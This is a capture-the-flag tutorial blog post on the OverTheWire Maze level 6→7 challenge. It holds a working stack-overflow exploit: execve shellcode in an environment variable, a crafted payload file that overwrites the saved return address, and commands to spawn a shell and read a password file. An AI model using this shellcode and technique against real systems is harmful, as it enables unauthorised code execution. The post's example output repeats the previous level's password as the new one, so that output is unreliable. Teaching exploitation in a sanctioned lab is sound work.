---
date: 2023-09-24 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Maze Level 6 → 7 tutorial!!"
permalink: /posts/overTheWire-Maze-Level-6-to-7/
tags: [overthewire, maze, pwn, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Maze Level 6 → 7!!"
---

<!-- Scoped styles -->
<style>
  .maze-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .maze-nav .nav-left,.maze-nav .nav-center,.maze-nav .nav-right{flex:1}
  .maze-nav .nav-left{text-align:left}
  .maze-nav .nav-center{text-align:center}
  .maze-nav .nav-right{text-align:right}
  .maze-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .maze-nav a:hover{transform:translateY(-1px)}
  .maze-nav .disabled{opacity:.55}
  :root[data-theme='light'] .maze-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="maze-nav" aria-label="Maze level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Maze-Level-5-to-6/' | relative_url }}">← Previous: Level 5 → 6</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/maze/maze7.html" target="_blank" rel="noopener">
      Official (Level 7) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Maze-Level-7-to-8/' | relative_url }}">Next: Level 7 → 8 →</a>
  </div>
</nav>

## Login

Use the **maze6** account from the previous level.

```bash
ssh maze6@maze.labs.overthewire.org -p <PORT>
# password: pohninieng
````

> Binary for this challenge: `/maze/maze7`

---

## Task

Abuse the unsafe buffer handling in `Print_Shdrs()` to **overflow the stack** and redirect execution to our shellcode in the environment.

---

## A little bit of Theory

The program loads ELF headers and prints section headers:

* `main` reads the ELF header, then calls `Print_Shdrs()`.
* Inside `Print_Shdrs`, there’s a local `dummy` buffer at **ebp-60**.
* Then comes this dangerous line:

```c
read(fd, p, size);
```

Where `p = &dummy`.
→ If `size > 60`, the `read` **overflows the stack frame**, smashing saved EIP.

Key notes:

* By controlling `size`, we control how far we overwrite.
* Setting `size = 0x44 (68)` makes it overwrite saved EIP cleanly.
* Other parameters (`num`, `shstrndx`, etc.) don’t matter if we make them **zero**.
* We only need the loop to run once, so `num = 0`.

---

## Step 1 — Prepare shellcode in the environment

Same trick as previous levels: store shellcode in `$SC`, padded with a NOP sled:

```bash
export SC=$(python - <<'PY'
print("\x90"*100 + 
      "\x31\xc0\x50\x68\x2f\x2f\x73\x68" +
      "\x68\x2f\x62\x69\x6e" +
      "\x89\xe3\x89\xc1\x89\xc2" +
      "\xb0\x0b\xcd\x80" +
      "\x31\xc0\x40\xcd\x80")
PY
)
```

---

## Step 2 — Craft a malicious ELF-like file

We need the file to:

* Pass early ELF checks.
* Trigger `size = 0x44`.
* Place an overwrite for EIP pointing into `$SC`.

Minimal payload:

```bash
python - <<'PY' > hello
import sys
payload  = "\x00"*32                # padding
payload += "\x00\x00\x00\x00"       # offset values
payload += "\x00"*10
payload += "\x44\x00"               # size = 0x44
payload += "\x00\x00"
payload += "\x00\x00\x00\x00"
payload += "\x00"*10
payload += "\x0c\xdf\xff\xff"       # RET -> inside our env (adjust if needed)
sys.stdout.write(payload)
PY
```

---

## Step 3 — Run the exploit

```bash
/maze/maze7 hello
```

If the return address correctly points into the NOP sled, execution slides into our shellcode, spawning a shell.

---

## Step 4 — Grab the password

Inside the new shell:

```bash
id
cat /etc/maze_pass/maze7
```

Example output:

```
pohninieng
```

---

## Why this works (tl;dr)

* `read(fd, p, size)` writes **size bytes** into a small stack buffer.
* With `size = 0x44`, we overwrite saved EIP.
* We set EIP to point into our `$SC` NOP sled → shellcode runs.
* From there, we spawn `/bin/sh` and read the next password.

---

## Troubleshooting tips

* If it crashes without shell:
  → Check that your **return address** (`0xffffdf0c` style) really points inside `$SC`. Use `getenv("SC")` in `gdb`.
* If the loop runs too many times:
  → Ensure `num = 0` in the crafted file.
* If nothing happens:
  → Verify NX is off for `/maze/maze7` (`checksec`). Otherwise, need `ret2libc`.

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
